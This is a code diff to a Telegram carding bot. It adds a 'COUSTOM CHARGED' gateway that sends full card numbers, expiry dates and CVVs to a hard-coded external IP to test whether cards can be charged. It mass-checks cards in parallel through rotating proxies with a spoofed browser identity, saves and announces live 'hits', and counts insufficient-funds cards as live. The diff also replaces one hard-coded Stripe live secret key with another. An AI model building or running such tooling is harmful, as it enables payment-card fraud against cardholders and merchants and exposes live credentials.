@@ -302,6 +302,7 @@ MASS_CHECK_GATEWAY_TASK_DICT_NAMES = {
     "mst": "strip5_active_tasks",
     "msk": "stripe_sk_active_tasks",
     "msq": "sq_active_tasks",
+    "msy": "cc_active_tasks",
 }
 
 # Premium custom-emoji IDs used as button icons (icon_custom_emoji_id) on the
@@ -12628,6 +12629,7 @@ class GatewayManager:
             "dabbagh": {"enabled": True, "name": "Dabbagh Stripe", "emoji": "💳"},
             "united_way": {"enabled": True, "name": "United Way", "emoji": "💳"},
             "square_1usd": {"enabled": True, "name": "Square 1$", "emoji": "🟦"},
+            "coustom_charged": {"enabled": True, "name": "COUSTOM CHARGED", "emoji": "🔥"},
             
             # Razorpay
             "razorpay": {"enabled": True, "name": "Razorpay", "emoji": "💰"},
@@ -12782,6 +12784,7 @@ class GatewayManager:
             "st1auth": "st1", "st1_gateway": "st1_gateway",
             "sk": "stripe_sk", "msk": "stripe_sk",
             "sq": "square_1usd", "msq": "square_1usd",
+            "sy": "coustom_charged", "msy": "coustom_charged",
             "bt": "bt_kaffn8", "mbt": "bt_kaffn8",
             "stco": "stco",
             "whop": "whop", "jhit": "jhit",
@@ -25481,6 +25484,7 @@ class UserManager:
         "stco",             # /stco (Stripe Checkout) — free users: 1 credit per check
         "st1_charge",        # /st1 (ST1 $1 Charge) — free users: 1 credit per check
         "stripe_chk",        # /chk (Stripe Auth) — free users: 1 credit per check
+        "coustom_charged",   # /sy (COUSTOM CHARGED) — free users: 1 credit per card
     ]
 
     # ─────────────────────────────────────────────────────────────
@@ -25546,6 +25550,7 @@ class UserManager:
                 "stco",
                 "jhit",
                 "square_1usd",
+                "coustom_charged",
             ],
             "can_add_autosopi_sites": True,
             "can_mass_check": True,
@@ -25606,6 +25611,7 @@ class UserManager:
                 "stripe_sk",
                 "bt_kaffn8",     # /bt reply-flow checks this key
                 "square_1usd",
+                "coustom_charged",
             ],
             "can_add_autosopi_sites": True,
             "can_mass_check": True,
@@ -25662,6 +25668,7 @@ class UserManager:
                 "st1",
                 "stripe_sk",
                 "square_1usd",
+                "coustom_charged",
             ],
             "can_add_autosopi_sites": True,
             "can_mass_check": True,
@@ -36512,6 +36519,658 @@ async def sq_mass_logic(update: Update, context: ContextTypes.DEFAULT_TYPE,
     finally:
         sq_active_tasks.pop(u_id, None)
         print(f"🏁 [Square Mass] session ended for user {u_id}")
+
+
+# ══════════════════════════════════════════════════════════════════════
+#  COUSTOM CHARGED  —  /sy  (single)   ·   /msy  (mass)
+#
+#  Endpoint : http://194.26.192.15:5011/pay?lista=NUMBER|MM|YY|CVV
+#  Response : {"Response":"...","Status":"Approved ✅","Took":"19.6s"}
+#
+#  The output card is byte-for-byte the same layout as the Shopify
+#  single check (sparkle header, CARD / Response / Price / BIN / Bank /
+#  Country) and the mass check uses the shared Live/Dead/Charged/All
+#  keyboard.
+# ══════════════════════════════════════════════════════════════════════
+
+CC_LABEL        = "COUSTOM CHARGED"
+CC_URL_TEMPLATE = "http://194.26.192.15:5011/pay?lista={lista}"
+CC_PRICE_LABEL  = "0.50$"   # shown on the Price line — change if the endpoint charges a fixed amount
+CC_HIT_EMOJI_ID = "5902002809573740949"   # ✅ premium emoji for charges AND no-funds hits
+CC_TIMEOUT      = httpx.Timeout(45.0, connect=15.0, read=35.0)
+
+cc_active_tasks = {}
+
+# Country -> flag, same table the Shopify UI uses
+_CC_FLAG_MAP = {
+    "USA": "🇺🇸", "UNITED STATES": "🇺🇸",
+    "UK": "🇬🇧", "UNITED KINGDOM": "🇬🇧",
+    "CANADA": "🇨🇦", "AUSTRALIA": "🇦🇺",
+    "INDIA": "🇮🇳", "UAE": "🇦🇪",
+    "MALAYSIA": "🇲🇾", "SINGAPORE": "🇸🇬",
+    "THAILAND": "🇹🇭", "INDONESIA": "🇮🇩",
+    "PHILIPPINES": "🇵🇭", "VIETNAM": "🇻🇳",
+    "JAPAN": "🇯🇵", "KOREA": "🇰🇷",
+    "GERMANY": "🇩🇪", "FRANCE": "🇫🇷",
+    "ITALY": "🇮🇹", "SPAIN": "🇪🇸",
+    "ECUADOR": "🇪🇨", "BRAZIL": "🇧🇷",
+    "MEXICO": "🇲🇽", "TURKEY": "🇹🇷",
+    "NIGERIA": "🇳🇬", "SOUTH AFRICA": "🇿🇦",
+    "PAKISTAN": "🇵🇰", "BANGLADESH": "🇧🇩",
+}
+
+
+def _cc_format_card(card_str: str):
+    """Normalise a card to 'NUMBER|MM|YY|CVV' (gateway's `lista=` format)."""
+    parts = [p.strip() for p in str(card_str or "").split("|")]
+    if len(parts) < 4:
+        return None
+    number = re.sub(r"\D", "", parts[0])
+    month  = re.sub(r"\D", "", parts[1]).zfill(2)
+    year   = re.sub(r"\D", "", parts[2])
+    cvv    = re.sub(r"\D", "", parts[3])
+    if len(number) < 13 or len(cvv) < 3 or not month:
+        return None
+    if len(year) >= 4:
+        year = year[-2:]
+    elif len(year) == 1:
+        year = "0" + year
+    return f"{number}|{month}|{year}|{cvv}"
+
+
+def _cc_parse_body(body: str) -> dict:
+    """Turn the raw gateway body into {response, status, took, raw}."""
+    raw = (body or "").strip()
+    response = status = took = ""
+    try:
+        data = json.loads(raw)
+        if isinstance(data, dict):
+            low = {str(k).lower(): v for k, v in data.items()}
+            response = str(low.get("response", "") or "")
+            status   = str(low.get("status", "") or "")
+            took     = str(low.get("took", "") or "")
+    except Exception:
+        response = raw[:200]
+    if not response and not status:
+        response = raw[:200] or "No response"
+    return {"response": response, "status": status, "took": took, "raw": raw[:600]}
+
+
+def _cc_classify(payload: dict):
+    """Map the gateway reply to CHARGED / DECLINED / ERROR plus display text."""
+    resp   = str(payload.get("response", "") or "").strip()
+    status = str(payload.get("status", "") or "").strip()
+
+    text = re.sub(r"<[^>]+>", "", resp if resp else status)
+    text = re.sub(r"\s+", " ", text).strip() or "Unknown"
+
+    resp_l   = resp.lower()
+    status_l = status.lower()
+
+    decline_markers = (
+        "decline", "declined", "insufficient", "not sufficient", "do not honor",
+        "pick up", "expired", "invalid", "not supported", "not allowed",
+        "refer to issuer", "restricted", "blocked", "fraud", "stolen",
+        "call issuer", "transaction cannot",
+    )
+    approve_markers = ("approved", "approve", "success", "successful", "charged", "captured")
+
+    # NOTE: this gateway sometimes answers Status "Approved ✅" for the API call
+    # while the Response carries the real card verdict ("DECLINE - ...").
+    # The Response wins whenever it names a decline, so a DECLINE is never
+    # counted as a hit.
+    if any(m in resp_l for m in decline_markers):
+        return "DECLINED", text
+    if any(m in resp_l for m in approve_markers):
+        return "CHARGED", text
+    if any(m in status_l for m in approve_markers):
+        return "CHARGED", text
+    if any(m in (resp_l + " " + status_l) for m in decline_markers):
+        return "DECLINED", text
+    return "ERROR", text
+
+
+async def cc_check_card(card_str: str, proxy: str = None) -> dict:
+    """Hit the COUSTOM CHARGED endpoint for one card."""
+    formatted = _cc_format_card(card_str)
+    if not formatted:
+        return {"category": "ERROR", "message": "Bad card format",
+                "response": "Bad card format", "status": "", "took": "", "raw": ""}
+
+    url = CC_URL_TEMPLATE.format(lista=formatted)
+    proxy_url = format_proxy(proxy) if proxy else None
+    headers = {
+        "Accept": "application/json, text/plain, */*",
+        "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                       "AppleWebKit/537.36 (KHTML, like Gecko) "
+                       "Chrome/131.0.0.0 Safari/537.36"),
+    }
+
+    try:
+        async with httpx.AsyncClient(
+            timeout=CC_TIMEOUT, verify=False, proxy=proxy_url, follow_redirects=True
+        ) as client:
+            r = await client.get(url, headers=headers)
+            body = r.text
+    except Exception as e:
+        msg = f"Request failed: {str(e)[:90]}"
+        return {"category": "ERROR", "message": msg, "response": msg,
+                "status": "", "took": "", "raw": ""}
+
+    payload = _cc_parse_body(body)
+    category, message = _cc_classify(payload)
+    payload["category"] = category
+    payload["message"] = message
+    return payload
+
+
+def _cc_display_text(category: str, message: str) -> str:
+    """
+    Turn the gateway's raw reply into the short label the card shows.
+
+        CHARGED   -> "Payment Successful"
+        DECLINED  -> "INSUFFICIENT_FUNDS" if the bank said so, else "DECLINE"
+        ERROR     -> the cleaned raw text
+
+    The raw replies look like:
+        "Charged 1$ [CVN]: Match | TxID: 723439988"
+        "Service not allowed | TxID: 723440201"
+        "DECLINE - Decline [CVN]: Match | TxID: 723440372"
+        "DECLINE - Not sufficient funds [CVN]: Match | TxID: 723440562"
+    so the "[CVN]: ..." and "| TxID: ..." noise is stripped first.
+    """
+    clean = re.sub(r"<[^>]+>", "", str(message or "")).strip()
+    # Drop the gateway's trailing "| TxID: 123456" noise.
+    clean = re.split(r"\|\s*TxID\s*:", clean, flags=re.I)[0].strip()
+    clean = re.sub(r"\s+", " ", clean).strip()
+
+    low = clean.lower()
+
+    if category == "CHARGED":
+        return "Payment Successful"
+
+    if category == "DECLINED":
+        if ("insufficient" in low) or ("not sufficient" in low) or ("nsf" in low) \
+                or ("funds" in low and "sufficient" in low):
+            return "INSUFFICIENT_FUNDS"
+        return "DECLINE"
+
+    if len(clean) > 110:
+        clean = clean[:107] + "..."
+    return clean or "Unknown"
+
+
+def _cc_is_hit(category: str, message: str) -> bool:
+    """
+    True when a COUSTOM CHARGED result counts as a HIT:
+      * a real charge ("Payment Successful"), or
+      * an insufficient / no-funds decline.
+
+    A no-funds card is a live card, so it gets the same ✅ emoji, the same
+    hit notification and the same "Charged" bucket as a real charge.
+    """
+    if category == "CHARGED":
+        return True
+    if category == "DECLINED":
+        return _cc_display_text(category, message) == "INSUFFICIENT_FUNDS"
+    return False
+
+
+def cc_format_result(category: str, message: str, card: str, bin_info: tuple) -> str:
+    """Shopify-style result card for a single COUSTOM CHARGED check."""
+    info = list(bin_info or []) + ["N/A", "Unknown", "Unknown"]
+    bin_info_text, bank, country = info[0], info[1], info[2]
+
+    if _cc_is_hit(category, message):
+        emoji = premium_emoji(CC_HIT_EMOJI_ID, "✅")
+    elif category == "DECLINED":
+        emoji = premium_emoji(PREMIUM_EMOJI_IDS.get("declined", "6267039884016358504"), "❌")
+    else:
+        emoji = premium_emoji(PREMIUM_EMOJI_IDS.get("error", "6282641460093260838"), "⚠️")
+
+    bank_display = bank if isinstance(bank, str) and bank and bank != "N/A" else "Unknown"
+    if len(bank_display) > 30:
+        bank_display = bank_display[:27] + "..."
+
+    country_name = str(country or "Unknown").replace("🌐", "").strip() or "Unknown"
+    flag_re = "🇦🇧🇨🇩🇪🇫🇬🇭🇮🇯🇰🇱🇲🇳🇴🇵🇶🇷🇸🇹🇺🇻🇼🇽🇾🇿"
+    if any(ch in country_name for ch in flag_re):
+        country_display = country_name
+    else:
+        flag = "🌍"
+        upper = country_name.upper()
+        for key, val in _CC_FLAG_MAP.items():
+            if key in upper:
+                flag = val
+                break
+        country_display = f"{flag}  {country_name}"
+
+    clean = _cc_display_text(category, message)
+
+    return (
+        f"<b>{CC_LABEL}</b> {_UI_SPARKLE}\n\n"
+        f"{_UI_STAR} 𝗖𝗔𝗥𝗗 ↣ <code>{card}</code>\n\n"
+        f"{emoji} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ↣ <code>{clean}</code>\n"
+        f"{_UI_COIN} 𝗣𝗿𝗶𝗰𝗲 ↣ <b>{CC_PRICE_LABEL}</b>\n\n"
+        f"{_UI_GLOBE} 𝗕𝗜𝗡 ↣ <b>{bin_info_text}</b>\n"
+        f"{_UI_ROCKET} 𝗕𝗮𝗻𝗸 ↣ <b>{bank_display}</b>\n"
+        f"{_UI_BIN} 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↣ <b>{country_display}</b>"
+    )
+
+
+def _cc_pick_proxies(user_id: int) -> list:
+    """Proxies this user may rotate through (honours /offproxy)."""
+    try:
+        if not user_manager.can_use_proxy(user_id):
+            return []
+        if not gateway_manager.is_proxy_enabled("coustom_charged"):
+            return []
+    except Exception:
+        return []
+
+    proxies = []
+    try:
+        if user_id in autosopi_proxy_tracker.working_proxies and \
+           autosopi_proxy_tracker.working_proxies[user_id]:
+            proxies = list(autosopi_proxy_tracker.working_proxies[user_id])
+    except Exception:
+        proxies = []
+    if not proxies:
+        try:
+            if global_proxy_pool.enabled and global_proxy_pool.proxies:
+                proxies = list(global_proxy_pool.proxies)
+        except Exception:
+            proxies = []
+    return proxies
+
+
+async def _cc_collect_cards(update, context) -> list:
+    """Collect cards from the command args, the replied text, or a replied file."""
+    message = update.effective_message
+    reply = message.reply_to_message if message else None
+    user_id = update.effective_user.id
+    cards = []
+
+    # 1) cards typed after the command
+    if context.args:
+        for tok in " ".join(context.args).split():
+            c = card_formatter.extract_single_card_from_text(tok)
+            if c:
+                cards.append(c)
+
+    # 2) cards cached from a file upload this user replied to
+    if not cards and user_id in pending_files:
+        try:
+            cached = pending_files.get(user_id) or {}
+            if cached.get("cards"):
+                cards = list(cached["cards"])
+                pending_files.pop(user_id, None)
+        except Exception:
+            pass
+
+    # 3) replied message is a .txt/.csv file
+    if not cards and reply is not None and reply.document:
+        try:
+            tg_file = await reply.document.get_file()
+            raw = await tg_file.download_as_bytearray()
+            content = raw.decode("utf-8", errors="ignore")
+            for line in content.splitlines():
+                line = line.strip()
+                if not line or line.startswith("#"):
+                    continue
+                c = card_formatter.extract_single_card_from_text(line)
+                if c:
+                    cards.append(c)
+        except Exception as e:
+            print(f"❌ [COUSTOM CHARGED] file read error: {e}")
+
+    # 4) replied text / caption
+    if not cards and reply is not None and (reply.text or reply.caption):
+        text = reply.text or reply.caption or ""
+        cards = card_formatter.extract_cards(text)
+        if not cards:
+            single = card_formatter.extract_single_card_from_text(text)
+            if single:
+                cards = [single]
+
+    # de-duplicate, keep order
+    seen, unique = set(), []
+    for c in cards:
+        if c not in seen:
+            seen.add(c)
+            unique.append(c)
+    return unique
+
+
+async def cc_single_logic(update, context, card: str):
+    """Run one COUSTOM CHARGED check (caller handles access + credits)."""
+    u_id = update.effective_user.id
+    message = update.effective_message
+    tier = user_manager.get_tier(u_id)
+
+    status_msg = await message.reply_text(
+        build_single_check_checking(CC_LABEL, card, price=CC_PRICE_LABEL),
+        parse_mode=ParseMode.HTML,
+    )
+
+    try:
+        proxies = _cc_pick_proxies(u_id)
+        proxy = proxies[0] if proxies else None
+
+        res = await cc_check_card(card, proxy)
+        category = res.get("category", "ERROR")
+        response_text = res.get("message", "Unknown")
+
+        bin_info = await get_bin_info(card)
+        ui = cc_format_result(category, response_text, card, bin_info)
+
+        try:
+            await status_msg.edit_text(ui, parse_mode=ParseMode.HTML)
+        except Exception:
+            await message.reply_text(ui, parse_mode=ParseMode.HTML)
+
+        if _cc_is_hit(category, response_text):
+            display_text = _cc_display_text(category, response_text)
+            await save_hit_to_file(
+                card=card, gateway=CC_LABEL,
+                response=display_text, price=CC_PRICE_LABEL,
+                bin_info=bin_info, user_id=u_id, user_tier=tier)
+
+            user_data = user_manager.get_user(u_id)
+            await send_hit_notification(
+                context=context, gateway=CC_LABEL,
+                card=card, response=display_text, price=CC_PRICE_LABEL,
+                user=user_data, bin_info=bin_info,
+                status_category="charged")
+            user_manager.increment_hits(u_id)
+
+        user_manager.increment_checks(u_id)
+
+    except Exception as e:
+        try:
+            await status_msg.edit_text(f"❌ Error: {str(e)[:100]}")
+        except Exception:
+            await message.reply_text(f"❌ Error: {str(e)[:100]}")
+        print(f"❌ [COUSTOM CHARGED single] {traceback.format_exc()}")
+        if user_manager.get_tier(u_id) == "free":
+            add_user_credits(u_id, 1)
+    finally:
+        cc_active_tasks.pop(u_id, None)
+
+
+# ============================================================
+#   /sy  —  SINGLE CHECK
+# ============================================================
+@check_gateway("coustom_charged")
+async def sy_single(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Single card check via COUSTOM CHARGED."""
+    if not await verify_group_access(update, context):
+        return
+
+    user_id = update.effective_user.id
+    message = update.effective_message
+
+    cards = await _cc_collect_cards(update, context)
+    if not cards:
+        await message.reply_text(
+            "🔥 <b>COUSTOM CHARGED — Single Check</b>\n\n"
+            "Usage: <code>/sy &lt;card&gt;</code>\n"
+            "Example: <code>/sy 4031630721650843|06|29|910</code>\n\n"
+            "You can also reply to a card (or a .txt of cards) with <code>/sy</code>.",
+            parse_mode=ParseMode.HTML,
+        )
+        return
+
+    # More than one card → hand over to the mass flow
+    if len(cards) > 1:
+        await cc_mass_run(update, context, cards)
+        return
+
+    if not await require_gateway_access(user_id, "coustom_charged", message):
+        return
+
+    can_proceed, err = await check_and_deduct_credits(
+        user_id, update, context, is_mass_check=False, card_count=1)
+    if not can_proceed:
+        await message.reply_text(err, parse_mode=ParseMode.HTML)
+        return
+
+    await cc_single_logic(update, context, cards[0])
+
+
+# ============================================================
+#   /msy  —  MASS CHECK
+# ============================================================
+@check_gateway("coustom_charged")
+async def cc_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Mass check via COUSTOM CHARGED."""
+    if not await verify_group_access(update, context):
+        return
+
+    user_id = update.effective_user.id
+    message = update.effective_message
+
+    cards = await _cc_collect_cards(update, context)
+    if not cards:
+        await message.reply_text(
+            "🔥 <b>COUSTOM CHARGED — Mass Check</b>\n\n"
+            "Usage:\n"
+            "• <code>/msy &lt;card1&gt; &lt;card2&gt; ...</code>\n"
+            "• Reply to a .txt/.csv file with <code>/msy</code>",
+            parse_mode=ParseMode.HTML,
+        )
+        return
+
+    await cc_mass_run(update, context, cards)
+
+
+async def cc_mass_run(update, context, cards: list, progress_msg=None, skip_credits: bool = False):
+    """COUSTOM CHARGED mass loop with the shared Live/Dead/Charged keyboard.
+
+    skip_credits=True is used by the reply-file handler, which has already
+    validated access and deducted the mass credits before dispatching.
+    """
+    u_id = update.effective_user.id
+    message = update.effective_message
+    total = len(cards)
+
+    if u_id in cc_active_tasks:
+        await message.reply_text("⚠️ Already running a COUSTOM CHARGED session. Use /stop.")
+        return
+
+    max_batch = user_manager.get_max_batch_size(u_id)
+    if len(cards) > max_batch:
+        cards = cards[:max_batch]
+        total = len(cards)
+        try:
+            await message.reply_text(f"⚠️ Truncated to {max_batch} cards.")
+        except Exception:
+            pass
+
+    if not await require_gateway_access(u_id, "coustom_charged", message):
+        return
+
+    if not skip_credits:
+        can_proceed, err = await check_and_deduct_mass_credits(
+            u_id, update, context, total)
+        if not can_proceed:
+            await message.reply_text(err, parse_mode=ParseMode.HTML)
+            return
+
+    print(f"\n{'='*80}\n🚀 [COUSTOM CHARGED MASS] user={u_id} cards={total}\n{'='*80}")
+
+    session_id = create_session(u_id, CC_LABEL, total)
+    mc_init_session_cards(session_id)
+
+    user_proxies = _cc_pick_proxies(u_id)
+
+    stats = {
+        "charged": 0,
+        "approved": 0,
+        "declined": 0,
+        "errors": 0,
+        "processed": 0,
+        "total": total,
+    }
+    start_time = time.time()
+    proxy_index = 0
+
+    try:
+        cc_active_tasks[u_id] = True
+        tier = user_manager.get_tier(u_id)
+
+        CONCURRENCY = {"free": 1, "premium": 3, "ultimate": 5, "admin": 8}.get(tier, 3)
+
+        charged_emoji  = premium_emoji(PREMIUM_EMOJI_IDS["charged"],  "🔥")
+        approved_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        dead_emoji     = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
+        errors_emoji   = premium_emoji(PREMIUM_EMOJI_IDS["error"],    "⚠️")
+
+        if progress_msg is None:
+            initial = (
+                f"<b>Gateway</b> ➛ {CC_LABEL}\n"
+                f"<b>Status</b> ➛ STARTING...\n"
+                f"<b>Checked</b> ➛ 0/{total}\n"
+                f"<b>Charged</b> ➛ 0 {charged_emoji}\n"
+                f"<b>Approved</b> ➛ 0 {approved_emoji}\n"
+                f"<b>Declined</b> ➛ 0 {dead_emoji}\n"
+                f"<b>Errors</b> ➛ 0 {errors_emoji}\n"
+                f"<b>Time</b> ➛ 0s"
+            )
+            progress_msg = await message.reply_text(
+                initial,
+                parse_mode=ParseMode.HTML,
+                reply_markup=build_mass_check_keyboard(stats, u_id, session_id, "msy"),
+            )
+
+        sem = asyncio.Semaphore(CONCURRENCY)
+        stats_lock = asyncio.Lock()
+        processed = 0
+
+        async def update_progress(force: bool = False):
+            if not force and processed and processed % 5 != 0 and processed < total:
+                return
+            elapsed = int(time.time() - start_time)
+            mins, secs = elapsed // 60, elapsed % 60
+            tstr = f"{mins}m {secs}s" if mins else f"{secs}s"
+            text = (
+                f"<b>Gateway</b> ➛ {CC_LABEL}\n"
+                f"<b>Status</b> ➛ PROCESSING {processed}/{total}\n"
+                f"<b>Checked</b> ➛ {processed}/{total}\n"
+                f"<b>Charged</b> ➛ {stats['charged']} {charged_emoji}\n"
+                f"<b>Approved</b> ➛ {stats['approved']} {approved_emoji}\n"
+                f"<b>Declined</b> ➛ {stats['declined']} {dead_emoji}\n"
+                f"<b>Errors</b> ➛ {stats['errors']} {errors_emoji}\n"
+                f"<b>Time</b> ➛ {tstr}"
+            )
+            try:
+                await progress_msg.edit_text(
+                    text,
+                    parse_mode=ParseMode.HTML,
+                    reply_markup=build_mass_check_keyboard(
+                        stats, u_id, session_id, "msy", finished=(processed >= total)),
+                )
+            except Exception:
+                pass
+
+        async def process_one(card, idx):
+            nonlocal processed, proxy_index
+            async with sem:
+                await asyncio.sleep(random.uniform(0.1, 0.3))
+
+                proxy_url = None
+                if user_proxies:
+                    proxy_url = user_proxies[proxy_index % len(user_proxies)]
+                    proxy_index += 1
+
+                res = await cc_check_card(card, proxy_url)
+                category = res.get("category", "ERROR")
+                response_text = res.get("message", "Unknown")
+
+                async with stats_lock:
+                    processed += 1
+                    if _cc_is_hit(category, response_text):
+                        stats["charged"] += 1
+                        mc_track(session_id, "charged", card)
+                    elif category == "DECLINED":
+                        stats["declined"] += 1
+                        mc_track(session_id, "dead", card)
+                    else:
+                        stats["errors"] += 1
+                        mc_track(session_id, "dead", card)
+                    await update_progress()
+
+                if _cc_is_hit(category, response_text):
+                    display_text = _cc_display_text(category, response_text)
+                    bin_info = await get_bin_info(card)
+                    ui = cc_format_result(category, response_text, card, bin_info)
+                    try:
+                        await message.reply_text(ui, parse_mode=ParseMode.HTML)
+                    except Exception as e:
+                        print(f"❌ send result: {e}")
+
+                    await save_hit_to_file(
+                        card=card, gateway=CC_LABEL,
+                        response=display_text, price=CC_PRICE_LABEL,
+                        bin_info=bin_info, user_id=u_id, user_tier=tier)
+
+                    user_data = user_manager.get_user(u_id)
+                    await send_hit_notification(
+                        context=context, gateway=CC_LABEL,
+                        card=card, response=display_text, price=CC_PRICE_LABEL,
+                        user=user_data, bin_info=bin_info,
+                        status_category="charged")
+                    user_manager.increment_hits(u_id)
+
+                user_manager.increment_checks(u_id, 1)
+
+        tasks = [asyncio.create_task(process_one(c, i)) for i, c in enumerate(cards)]
+        for coro in asyncio.as_completed(tasks):
+            if u_id not in cc_active_tasks:
+                break
+            try:
+                await coro
+            except Exception as e:
+                print(f"❌ task error: {e}")
+                async with stats_lock:
+                    stats["errors"] += 1
+
+        if u_id in cc_active_tasks:
+            total_t = time.time() - start_time
+            mins, secs = int(total_t // 60), int(total_t % 60)
+            await update_progress(force=True)
+            summary = (
+                f"🔥 <b>{CC_LABEL} Mass Check Complete</b>\n\n"
+                f"{charged_emoji} <b>Charged</b> ➛ {stats['charged']}\n"
+                f"{approved_emoji} <b>Approved</b> ➛ {stats['approved']}\n"
+                f"{dead_emoji} <b>Declined</b> ➛ {stats['declined']}\n"
+                f"{errors_emoji} <b>Errors</b> ➛ {stats['errors']}\n"
+                f"📝 <b>Total</b> ➛ {total}\n"
+                f"⏱️ <b>Time</b> ➛ {mins}m {secs}s"
+            )
+            try:
+                await context.bot.send_message(
+                    chat_id=message.chat_id,
+                    text=summary,
+                    parse_mode=ParseMode.HTML,
+                    reply_markup=build_mass_check_keyboard(
+                        stats, u_id, session_id, "msy", finished=True),
+                )
+            except Exception as e:
+                print(f"⚠️ summary send failed: {e}")
+
+        return stats
+
+    except Exception as e:
+        print(f"❌ cc_mass_run error: {e}\n{traceback.format_exc()}")
+        try:
+            if progress_msg:
+                await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}")
+        except Exception:
+            pass
+    finally:
+        cc_active_tasks.pop(u_id, None)
+        print(f"🏁 [COUSTOM CHARGED] session ended for user {u_id}")
 
 
 # ============ ADYEN GATEWAY (Picsart) - FIXED ============
@@ -47800,7 +48459,7 @@ stripe_sk_active_tasks: dict = {}
 SK_FILE_PATH = Path("FILES/live_sk.json")
 
 # ── DEFAULT SK ─────────────────────────────────────────────────────────────
-DEFAULT_SK = "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"
+DEFAULT_SK = "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"
 
 
 # ── Fake billing generator ─────────────────────────────────────────────────
@@ -77898,7 +78557,9 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"🔑  <b>Stripe SK Charge</b>\n"
             f"<code>   /sk</code>  single   <code>/msk</code>  mass\n\n"
             f"🌿  <b>Braintree Auth</b>\n"
-            f"<code>   /bt</code>  single\n"
+            f"<code>   /bt</code>  single\n\n"
+            f"💫  <b>COUSTOM CHARGED</b>\n"
+            f"<code>   /sy</code>  single   <code>/msy</code>  mass\n"
             f"<code>━━━━━━━━━━━━━━━━━━━━━</code>"
         )
         keyboard = [
@@ -77989,6 +78650,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"<code>  /chk /mchk</code> Stripe Auth\n"
             f"<code>  /pp /mpp</code>   PayPal\n"
             f"<code>  /btn /btnm</code> Braintree\n"
+            f"<code>  /sy /msy</code>   COUSTOM CHARGED\n"
             f"<code>━━━━━━━━━━━━━━━━━━━━━</code>\n"
             f"🛠 <b>Tools</b>\n"
             f"<code>  /bin</code>  BIN Lookup\n"
@@ -78666,6 +79328,12 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
         '/pp':        'paypal_key', 
     }
 
+    # COUSTOM CHARGED (/sy single, /msy mass)
+    gateway_map.update({
+        '/sy':  'coustom_charged',
+        '/msy': 'coustom_charged',
+    })
+
     gateway = gateway_map.get(command)
     print(f"📦 [REPLY] Gateway: {gateway}")
 
@@ -78908,6 +79576,9 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
             context.args = [card]
             asyncio.create_task(single_check_ezycourse(update, context))
 
+        elif gateway == 'coustom_charged':
+            asyncio.create_task(cc_single_logic(update, context, card))
+
         return True
 
     # ── MASS-CARD DISPATCH (len(cards) > 1) ──────────────────────────────
@@ -79028,6 +79699,8 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
         asyncio.create_task(bt_kaffn8_mass_logic(update, context, cards, progress_msg))
     elif gateway == 'ezycourse':
         asyncio.create_task(ezycourse_mass_check_logic(update, context, cards, progress_msg))
+    elif gateway == 'coustom_charged':
+        asyncio.create_task(cc_mass_run(update, context, cards, progress_msg, skip_credits=True))
     else:
         try:
             await progress_msg.delete()
@@ -87542,6 +88215,10 @@ def main():
 
     app.add_handler(CommandHandler("sq",  sq_single,  block=False))
     app.add_handler(CommandHandler("msq", sq_mass,    block=False))
+
+    # ============ COUSTOM CHARGED GATE ============
+    app.add_handler(CommandHandler("sy",  sy_single, block=False))
+    app.add_handler(CommandHandler("msy", cc_mass,   block=False))
     
     app.add_handler(CommandHandler("sk",  single_check_stripe_sk))
     app.add_handler(CommandHandler("msk", mass_check_stripe_sk_command))
